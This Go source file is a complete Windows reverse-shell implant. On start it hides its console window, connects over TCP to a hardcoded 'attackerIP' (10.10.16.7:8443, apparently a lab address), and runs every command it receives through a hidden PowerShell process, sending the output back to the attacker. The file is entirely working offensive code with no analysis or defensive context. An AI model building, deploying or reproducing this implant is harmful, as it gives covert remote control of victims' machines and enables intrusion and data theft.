package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"sync"
	"time"
)

const (
	attackerIP = "10.10.16.7:8443"
)

var (
	shutdownSignal = make(chan struct{})
	cleanupOnce    sync.Once
	conn           net.Conn
	connMutex      sync.RWMutex
)

func init() {
	// Hide the console window on Windows
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	showWindow := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")

	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		const SW_HIDE = 0
		showWindow.Call(hwnd, SW_HIDE)
	}
}

// Get current directory for prompt
func getCurrentDir() string {
	cmd := exec.Command("powershell", "-Command", "pwd")
	output, err := cmd.Output()
	if err != nil {
		return "PS C:\\> "
	}
	
	dir := strings.TrimSpace(string(output))
	return fmt.Sprintf("[+] pOwErShElL %s> ", dir)
}

// Cleanup function to close connection and terminate
func cleanup() {
	cleanupOnce.Do(func() {
		// log.Println("Cleaning up and terminating...")
		
		// Close connection if open
		connMutex.RLock()
		if conn != nil {
			conn.Close()
			log.Println("Connection closed")
		}
		connMutex.RUnlock()
		
		// Allow a moment for cleanup
		time.Sleep(100 * time.Millisecond)
		
		// Terminate the process
		// log.Println("Terminating process...")
		os.Exit(0)
	})
}

// Reverse shell - single connection, no reconnection attempts
func reverseShellTCP(address string) error {
	defer cleanup()
	
	// Try to connect once
	var err error
	connMutex.Lock()
	conn, err = net.Dial("tcp", address)
	connMutex.Unlock()
	
	if err != nil {
		// log.Printf("Failed to connect to %s: %v", address, err)
		return fmt.Errorf("connection failed: %w", err)
	}
	
	// log.Printf("Connected to %s", address)
	defer conn.Close()
	
	reader := bufio.NewReader(conn)
	
	// Main command loop
	for {
		select {
		case <-shutdownSignal:
			// log.Println("Shutdown signal received")
			return nil
		default:
			// Send prompt
			prompt := getCurrentDir()
			connMutex.RLock()
			_, err := conn.Write([]byte(prompt))
			connMutex.RUnlock()
			
			if err != nil {
				// log.Printf("Connection lost: %v", err)
				return fmt.Errorf("connection lost: %w", err)
			}

			// Read command
			connMutex.RLock()
			command, err := reader.ReadString('\n')
			connMutex.RUnlock()
			
			if err != nil {
				// log.Printf("Connection closed or error: %v", err)
				return fmt.Errorf("read error: %w", err)
			}
			
			command = strings.TrimSpace(command)
			if command == "" {
				continue
			}

			// Execute command using PowerShell
			cmd := exec.Command("powershell", "-Command", command)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

			var output bytes.Buffer
			cmd.Stdout = &output
			cmd.Stderr = &output
			
			err = cmd.Run()
			if err != nil {
				fmt.Fprintf(&output, "Command execution error: %v\n", err)
			}

			// Send output
			connMutex.RLock()
			_, err = conn.Write([]byte(output.String()))
			connMutex.RUnlock()
			
			if err != nil {
				// log.Printf("Failed to send response: %v", err)
				return fmt.Errorf("write error: %w", err)
			}
		}
	}
}

func main() {
	// Setup signal handler for Ctrl+C and other termination signals
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt, syscall.SIGTERM, syscall.SIGINT)
	
	// Start cleanup in a separate goroutine
	go func() {
		<-signalChan
		// log.Println("\nReceived termination signal")
		shutdownSignal <- struct{}{}
		cleanup()
	}()
	
	// Also handle program exit via panic
	defer func() {
		if r := recover(); r != nil {
			// log.Printf("Panic recovered: %v", r)
			cleanup()
		}
	}()

	// log.Println("Starting reverse shell...")
	
	// Start reverse shell
	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		defer wg.Done()
		err := reverseShellTCP(attackerIP)
		if err != nil {
			// log.Printf("Reverse shell error: %v", err)
		}
	}()

	// Wait for shutdown signal or completion
	wg.Wait()
	// log.Println("Program terminated normally")
}
